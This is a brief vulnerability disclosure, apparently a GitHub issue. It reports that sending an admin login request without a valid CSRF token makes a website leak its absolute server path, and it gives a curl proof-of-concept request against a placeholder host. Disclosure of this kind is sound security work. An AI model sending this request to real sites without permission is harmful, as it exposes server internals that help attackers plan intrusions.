# There is an absolute path leak vulnerability  
The absolute path leakage of the website caused by deleting the CSRF token when the backend requests login
## poc

 ```
curl -i -s -k -X $'POST' \
    -H $'Host: {hostname}' -H $'Content-Length: 33' -H $'Sec-Ch-Ua: \"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"99\"' -H $'X-Csrf-Token: P9A63wYKU6jJtITypCb46zKA3q8RFJQgof0snK85' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' -H $'X-Requested-With: XMLHttpRequest' \
    --data-binary $'\x0d\x0ausername=123456&password=123456' \
    $'https://{hostname}/admin/auth/login'
```
![image](https://user-images.githubusercontent.com/131442419/233589434-0f6b3212-7f58-4da7-ae9d-c6ff80c8b97e.png)
